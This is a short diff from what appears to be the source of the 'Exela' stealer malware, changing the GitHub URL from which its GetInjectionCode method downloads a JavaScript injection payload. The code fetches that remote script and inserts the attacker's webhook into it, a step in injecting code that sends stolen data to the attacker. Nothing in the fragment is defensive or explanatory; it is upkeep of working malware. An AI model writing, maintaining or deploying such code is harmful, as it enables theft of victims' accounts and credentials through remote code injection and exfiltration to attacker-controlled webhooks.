@@ -1346,7 +1346,7 @@ class Main:
     async def GetInjectionCode(self) -> str:
         try:
             async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(ssl=True)) as session:
-                async with session.get("https://raw.githubusercontent.com/quicaxd/Exela-V2.0/main/injection/injection.js") as response:
+                async with session.get("https://raw.githubusercontent.com/justforExela/injection/main/injection.js") as response:
                     data = await response.text()
                     return data.replace("%WEBHOOK%", webhook)
         except:
